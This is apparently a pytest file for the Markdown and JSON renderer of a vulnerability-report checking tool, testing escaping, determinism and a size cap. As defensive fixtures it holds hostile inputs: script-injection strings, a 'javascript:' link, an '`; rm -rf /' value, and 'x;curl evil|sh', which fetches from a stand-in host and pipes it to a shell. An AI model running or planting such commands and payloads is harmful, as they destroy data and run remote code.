# SPDX-FileCopyrightText: 2026 The Nikasha Authors
# SPDX-License-Identifier: Apache-2.0
"""Markdown and JSON output (SPEC §15.3, §15.4).

The Markdown document is pasted into a GitHub issue or a HackerOne comment, so it has to
survive three things: the size cap, hostile report and repository text, and the
determinism rule. Every test here is about one of those.
"""

from __future__ import annotations

import json
import re

import pytest

from nikasha.fuse.scoring import Contribution, Ledger
from nikasha.fuse.verdict import Decision
from nikasha.model.claims import SymbolClaim
from nikasha.model.evidence import CodeLocation, CommandRecord, Evidence
from nikasha.model.report import Report, ReportSource, SourceMap, Span
from nikasha.model.result import Environment, ResolvedTarget, Result
from nikasha.model.verdict import Question, Verdict
from nikasha.pipeline import CheckReport
from nikasha.render.markdown import (
    MAX_CHARS,
    MIN_QUESTIONS,
    code_span,
    escape_inline,
    fence,
    link,
    render_markdown,
    render_markdown_result,
    rerun_command,
)
from nikasha.resolve.target import Resolution

REPO = "https://github.com/nikasha-demo/libhdr"
COMMIT = "3f2a9c1b7e4d5a6f8c0b1d2e3f4a5b6c7d8e9f01"

#: The payload a report title, a claim or a code excerpt may carry (P7). Each one breaks a
#: different part of the document if it reaches the output unescaped.
HOSTILE = (
    "</details><script>alert(1)</script>",
    "a | b | c",
    "`backtick` and ``double``",
    "```\nfenced\n```",
    "line one\nline two\r\nline three",
    "**bold** [link](https://evil.example) ![img](x)",
    "right\u202eto\u202dleft\u200b\u0007",
    "| --- | --- |",
)


# --- builders ---------------------------------------------------------------------------


def make_report(
    body: str = "hdr_decode() overflows", title: str | None = "Heap overflow"
) -> Report:
    return Report(
        id="report-1",
        source=ReportSource(kind="markdown", uri="examples/reports/demo.md"),
        title=title,
        body=body,
        source_map=SourceMap.identity(len(body)),
    )


def make_claim(text: str, *, claim_id: str = "claim-1", kind: str = "symbol") -> object:
    """A claim-shaped object. The renderer only reads ``id``, ``spans`` and ``kind``."""
    assert kind == "symbol"
    return SymbolClaim(
        id=claim_id,
        spans=(Span(start=0, end=len(text), text=text),),
        extractor="test",
        confidence=1.0,
        role="core",
        provenance="project_attributed",
        name=text[:64] or "x",
    )


def make_evidence(
    *,
    evidence_id: str = "ev-1",
    check_id: str = "C03",
    claim_ids: tuple[str, ...] = ("claim-1",),
    outcome: str = "REFUTES",
    strength: float = -2.2,
    summary: str = "never defined in any release v1.0.0-v1.3.0",
    excerpt: str | None = "int hdr_get(void) {\n    return 0;\n}",
    permalink: str | None = f"{REPO}/blob/{COMMIT}/src/hdr.c#L400-L412",
    details: dict[str, object] | None = None,
) -> Evidence:
    return Evidence(
        id=evidence_id,
        check_id=check_id,
        claim_ids=claim_ids,
        outcome=outcome,  # type: ignore[arg-type]
        strength=strength,
        group="symbols",
        summary=summary,
        details=details if details is not None else {"outcome": "never_in_history"},
        locations=(
            CodeLocation(
                repo=REPO,
                ref="v1.2.0",
                commit=COMMIT,
                path="src/hdr.c",
                start_line=400,
                end_line=412,
                excerpt=excerpt,
                permalink=permalink,
            ),
        ),
        commands=(
            CommandRecord(
                argv=("git", "log", "-S", "hdr_decode"),
                exit_code=0,
                stdout_sha256="ab" * 32,
                stderr_sha256="cd" * 32,
                duration_ms=12,
            ),
        ),
    )


def make_verdict(questions: int = 2, label: str = "UNGROUNDED") -> Verdict:
    return Verdict(
        label=label,  # type: ignore[arg-type]
        score=4,
        confidence="high",
        key_evidence=("ev-1",),
        questions=tuple(
            Question(
                text=f"Which commit were you on when frame {i} was produced?",
                rationale=f"The cited location does not exist at v1.2.0 ({i}).",
                evidence_ids=("ev-1",),
            )
            for i in range(questions)
        ),
        notes=("no core symbol was found in any release",),
        rule="r3a",
    )


def make_result(
    *,
    report: Report | None = None,
    claims: tuple[object, ...] = (),
    evidence: tuple[Evidence, ...] = (),
    verdict: Verdict | None = None,
    target: ResolvedTarget | None = None,
) -> Result:
    return Result(
        tool_version="0.1.0.dev0",
        report=report if report is not None else make_report(),
        claims=claims,  # type: ignore[arg-type]
        target=target
        if target is not None
        else ResolvedTarget(
            repo_url=REPO,
            ref_name="v1.2.0",
            commit=COMMIT,
            method="tag from the report",
            confidence="high",
        ),
        evidence=evidence,
        verdict=verdict,
        timings={"ingest": 0.01, "checks": 1.23},
        environment=Environment(mode="offline"),
    )


def full_result() -> Result:
    return make_result(
        claims=(make_claim("hdr_decode_chunked_value"),),
        evidence=(make_evidence(),),
        verdict=make_verdict(),
    )


def table_rows(text: str) -> list[str]:
    return [line for line in text.splitlines() if line.startswith("| ")]


def prose_of(text: str) -> str:
    """The document with every fenced block and code span removed.

    Content inside a fence or a code span is escaped by the Markdown renderer, so raw
    ``<`` there is harmless; anywhere else it would be live HTML.
    """
    kept: list[str] = []
    marker: str | None = None
    for line in text.splitlines():
        if marker is not None:
            if line == marker:
                marker = None
            continue
        if line.startswith("```"):
            marker = line[: len(line) - len(line.lstrip("`"))]
            continue
        kept.append(re.sub(r"(`+)(.*?)\1", " ", line))
    return "\n".join(kept)


# --- required content (SPEC §15.3) --------------------------------------------------------


def test_renders_every_required_section():
    out = render_markdown_result(full_result())
    assert "## Nikasha: ✗ UNGROUNDED — grounding 4/100, confidence high" in out
    assert "### Claims" in out
    assert "### Evidence" in out
    assert "### Questions for the reporter (2)" in out
    assert "<details>" in out and "</details>" in out
    assert f"{REPO}/blob/{COMMIT}/src/hdr.c#L400-L412" in out


def test_footer_names_the_tool_and_the_rerun_command():
    out = render_markdown_result(full_result())
    footer = out.splitlines()[-1]
    assert footer.startswith("Generated by Nikasha v")
    assert "(deterministic checks). Re-run: " in footer
    assert "nikasha check examples/reports/demo.md --repo" in footer


def test_top_evidence_carries_its_upstream_permalink():
    out = render_markdown_result(full_result())
    assert f"[`src/hdr.c` lines 400-412]({REPO}/blob/{COMMIT}/src/hdr.c#L400-L412)" in out


def test_claim_row_shows_the_outcome_and_the_evidence():
    out = render_markdown_result(full_result())
    row = next(r for r in table_rows(out) if "hdr" in r)
    assert "✗ refuted" in row
    assert "never defined in any release" in row


def test_a_claim_no_check_covered_is_unchecked_not_refuted():
    result = make_result(claims=(make_claim("hdrGet", claim_id="claim-9"),), verdict=make_verdict())
    out = render_markdown_result(result)
    row = next(r for r in table_rows(out) if "hdrGet" in r)
    assert "? unchecked" in row
    assert "refuted" not in row


def test_a_refutation_outranks_a_supporting_finding_on_the_same_claim():
    result = make_result(
        claims=(make_claim("hdrGet"),),
        evidence=(
            make_evidence(evidence_id="ev-a", outcome="SUPPORTS", strength=3.0, summary="found"),
            make_evidence(evidence_id="ev-b", outcome="REFUTES", strength=-0.5, summary="absent"),
        ),
        verdict=make_verdict(),
    )
    row = next(r for r in table_rows(render_markdown_result(result)) if "hdrGet" in r)
    assert "✗ refuted" in row


def test_render_markdown_accepts_a_check_report_and_shows_the_arithmetic():
    result = full_result()
    ledger = Ledger(
        prior=0.0,
        contributions=(
            Contribution(
                evidence_id="ev-1",
                check_id="C03",
                group="symbols",
                strength=-2.2,
                rank=0,
                weight=1.0,
                contribution=-2.2,
            ),
        ),
        log_odds=-2.2,
        score=4,
    )
    report = CheckReport(
        result=result,
        ledger=ledger,
        decision=Decision(label="UNGROUNDED", score=4, confidence="high", rule="r3a"),
        runs=(),
        resolution=Resolution(
            repo=None,  # type: ignore[arg-type]
            releases=None,  # type: ignore[arg-type]
            target=result.target,  # type: ignore[arg-type]
            project=None,
        ),
    )
    out = render_markdown(report)
    assert "How the score was computed" in out
    assert "total log-odds -2.200" in out
    assert out.startswith("## Nikasha: ✗ UNGROUNDED")


def test_a_result_without_a_verdict_still_renders():
    out = render_markdown_result(make_result())
    assert "no verdict" in out
    assert out.endswith("\n")


# --- determinism (P2) ---------------------------------------------------------------------


def test_markdown_is_byte_identical_across_runs():
    assert render_markdown_result(full_result()) == render_markdown_result(full_result())


def test_markdown_carries_no_timings_and_no_clock():
    out = render_markdown_result(full_result())
    assert "1.23" not in out
    assert "timings" not in out
    assert not re.search(r"\b20\d\d-\d\d-\d\d\b", out)


def test_evidence_order_does_not_depend_on_input_order():
    items = tuple(
        make_evidence(
            evidence_id=f"ev-{i}", claim_ids=("claim-1",), strength=-1.0 - i / 10, excerpt=None
        )
        for i in range(5)
    )
    one = make_result(claims=(make_claim("x"),), evidence=items, verdict=make_verdict())
    other = make_result(
        claims=(make_claim("x"),), evidence=tuple(reversed(items)), verdict=make_verdict()
    )
    assert render_markdown_result(one) == render_markdown_result(other)


# --- hostile input (P7) ---------------------------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_text_never_opens_an_html_element(payload):
    result = make_result(
        report=make_report(title=payload),
        claims=(make_claim(payload),),
        evidence=(make_evidence(summary=payload, excerpt=payload, details={"note": payload}),),
        verdict=Verdict(
            label="MIXED",
            score=50,
            confidence="low",
            questions=(Question(text=payload, rationale=payload, evidence_ids=("ev-1",)),),
            notes=(payload,),
        ),
    )
    prose = prose_of(render_markdown_result(result))
    assert "<script" not in prose
    # The only live HTML in the document is the <details>/<summary> scaffolding.
    tags = set(re.findall(r"</?[a-zA-Z][^>\n]*>", prose))
    assert tags <= {"<details>", "</details>", "<summary>", "</summary>"}
    assert prose.count("<details>") == prose.count("</details>")


@pytest.mark.parametrize("payload", HOSTILE)
def test_hostile_text_keeps_every_table_row_the_same_width(payload):
    result = make_result(
        claims=(make_claim(payload, claim_id="claim-1"), make_claim("hdr_get", claim_id="claim-2")),
        evidence=(make_evidence(summary=payload),),
        verdict=make_verdict(),
    )
    rows = table_rows(render_markdown_result(result))
    assert rows, "the claims table should have rendered"
    widths = {len(re.split(r"(?<!\\)\|", row)) for row in rows}
    assert widths == {7}, f"a cell added or removed a column: {widths}"


def test_pipes_in_a_cell_are_escaped_not_dropped():
    out = render_markdown_result(
        make_result(claims=(make_claim("a | b"),), evidence=(), verdict=make_verdict())
    )
    assert "a \\| b" in out


def test_triple_backticks_in_an_excerpt_cannot_close_the_fence():
    excerpt = "before\n```\n</details>\n````\nafter"
    out = render_markdown_result(
        make_result(
            claims=(make_claim("x"),),
            evidence=(make_evidence(excerpt=excerpt),),
            verdict=make_verdict(),
        )
    )
    lines = out.splitlines()
    start = lines.index("before") - 1
    opener = lines[start]
    marker = opener[: len(opener) - len(opener.lstrip("`"))]
    assert len(marker) > 4, "the fence must be longer than the longest run inside it"
    assert opener == marker + "c", "the language comes from the path, not from the content"
    end = lines.index(marker, start + 1)
    assert lines[start + 1 : end] == ["before", "```", "</details>", "````", "after"]
    assert lines.count(marker) == 1, "only the closing fence is a bare marker"


def test_backticks_in_a_value_cannot_escape_a_code_span():
    assert code_span("a`b") == "``a`b``"
    assert code_span("``x``") == "``` ``x`` ```"
    assert code_span("`") == "`` ` ``"
    assert code_span("a|b", in_table=True) == "`a\\|b`"


def test_escape_inline_flattens_and_escapes():
    assert escape_inline("a\nb") == "a b"
    assert escape_inline("</details>") == "&lt;/details&gt;"
    assert escape_inline("a & b") == "a &amp; b"
    assert escape_inline("_x_ *y* [z](u) |p|") == "\\_x\\_ \\*y\\* \\[z\\]\\(u\\) \\|p\\|"


def test_control_and_bidi_characters_are_removed():
    assert escape_inline("a\u202eb\u200cc\u0007d") == "a b c d"
    assert "\u202e" not in "".join(fence("x\u202ey"))


def test_a_very_long_single_line_is_bounded_everywhere():
    huge = "A" * 300_000
    result = make_result(
        report=make_report(title=huge, body=huge),
        claims=(make_claim(huge),),
        evidence=(make_evidence(summary=huge, excerpt=huge, details={"blob": huge}),),
        verdict=make_verdict(),
    )
    out = render_markdown_result(result)
    assert len(out) <= MAX_CHARS
    assert max(len(line) for line in out.splitlines()) < 1_000


def test_an_unsafe_permalink_is_never_turned_into_a_link():
    out = render_markdown_result(
        make_result(
            claims=(make_claim("x"),),
            evidence=(make_evidence(permalink="javascript:alert(1)"),),
            verdict=make_verdict(),
        )
    )
    assert "javascript:" not in out
    assert "](" not in out.split("### Evidence")[1].split("###")[0]


def test_link_only_accepts_plain_https_urls():
    assert link("a", f"{REPO}/blob/{COMMIT}/x.c#L1").startswith("[a](https://")
    assert link("a", "javascript:alert(1)") == "a"
    assert link("a", "https://x.example/a)b") == "a"
    assert link("a", "https://x.example/a b") == "a"
    assert link("a", None) == "a"


def test_a_hostile_repo_url_stays_inside_a_code_span():
    result = make_result(
        target=ResolvedTarget(
            repo_url="https://evil.example/a`b</summary><script>x</script>",
            method="`; rm -rf /",
            confidence="low",
        ),
        verdict=make_verdict(),
    )
    prose = prose_of(render_markdown_result(result))
    assert "<script" not in prose
    assert "evil.example" not in prose, "the repo URL must stay inside its code span"
    assert prose.count("<summary>") == prose.count("</summary>")


# --- the size cap (SPEC §15.3) --------------------------------------------------------------


def huge_result(claims: int = 400, evidence: int = 400, questions: int = 6) -> Result:
    claim_objs = tuple(
        make_claim("hdr_" + "x" * 90 + f"_{i}", claim_id=f"claim-{i}") for i in range(claims)
    )
    items = tuple(
        make_evidence(
            evidence_id=f"ev-{i:04d}",
            claim_ids=(f"claim-{i}",),
            strength=-2.0 + i / 1000,
            summary="a long finding sentence " * 12 + str(i),
            excerpt="\n".join(f"line {j} of the excerpt " + "z" * 80 for j in range(20)),
            details={f"key{k}": "v" * 200 for k in range(8)},
        )
        for i in range(evidence)
    )
    verdict = Verdict(
        label="UNGROUNDED",
        score=3,
        confidence="high",
        key_evidence=tuple(f"ev-{i:04d}" for i in range(min(10, evidence))),
        questions=tuple(
            Question(
                text=f"Question {i}: " + "could you share the exact commit? " * 6,
                rationale="Because " + "the cited location is absent. " * 6,
                evidence_ids=(f"ev-{i:04d}",),
            )
            for i in range(questions)
        ),
        notes=tuple(f"note {i} " + "n" * 100 for i in range(6)),
    )
    return make_result(claims=claim_objs, evidence=items, verdict=verdict)


def test_a_huge_result_stays_under_the_github_limit():
    out = render_markdown_result(huge_result())
    assert len(out) <= MAX_CHARS
    assert len(out) > 1_000, "the document should still be useful, not empty"


def test_truncation_is_stated_in_the_output():
    out = render_markdown_result(huge_result())
    assert "shortened to fit the comment size limit" in out
    assert "--format json" in out
    assert "Generated by Nikasha v" in out


def test_evidence_details_are_dropped_before_questions():
    out = render_markdown_result(huge_result())
    assert "Evidence details" not in out
    assert "### Questions for the reporter" in out
    assert out.count("could you share the exact commit?") >= MIN_QUESTIONS


def test_questions_are_never_cut_below_three():
    out = render_markdown_result(huge_result(claims=4000, evidence=2000, questions=6))
    assert len(out) <= MAX_CHARS
    numbered = re.findall(r"^\d+\. Question \d+:", out, flags=re.MULTILINE)
    assert len(numbered) >= MIN_QUESTIONS


def test_a_small_result_is_not_truncated():
    out = render_markdown_result(full_result())
    assert "shortened to fit" not in out
    assert "Evidence details (1)" in out


def test_the_hard_cut_still_closes_every_block():
    out = render_markdown_result(huge_result(), max_chars=1_600)
    assert len(out) <= 1_600
    assert out.count("<details>") == out.count("</details>")
    assert sum(1 for line in out.splitlines() if line.startswith("```")) % 2 == 0
    assert "\n\n---\n" in out, "the footer must not be glued to whatever the cut left"
    assert out.rstrip().endswith("`"), "the footer survives the cut"


def test_the_size_cap_is_the_documented_one():
    assert MAX_CHARS < 65_536


# --- JSON (SPEC §15.4) ----------------------------------------------------------------------


def test_result_json_round_trips():
    result = full_result()
    restored = Result.model_validate(json.loads(result.to_json()))
    assert restored == result
    assert restored.to_json() == result.to_json()


def test_result_json_is_byte_identical_across_runs_without_timings():
    one = full_result().to_json(include_timings=False)
    other = full_result().to_json(include_timings=False)
    assert one == other
    assert "timings" not in json.loads(one)
    assert json.loads(one)["schema"].endswith("result-v1.json")


def test_result_json_keys_are_sorted():
    payload = full_result().to_json()
    keys = list(json.loads(payload).keys())
    assert keys == sorted(keys)


def test_only_timings_differ_between_two_runs_of_the_same_input():
    one = make_result(verdict=make_verdict())
    other = one.model_copy(update={"timings": {"ingest": 9.99}})
    assert one.to_json() != other.to_json()
    assert one.to_json(include_timings=False) == other.to_json(include_timings=False)


def test_rerun_command_shell_quotes_report_derived_arguments():
    # The maintainer pastes the re-run line into a shell; a hostile URI must stay one
    # argument (P7).
    report = Report(
        id="report-1",
        source=ReportSource(kind="markdown", uri="x;curl evil|sh"),
        title="t",
        body="b",
        source_map=SourceMap.identity(1),
    )
    command = rerun_command(make_result(report=report))
    assert "'x;curl evil|sh'" in command
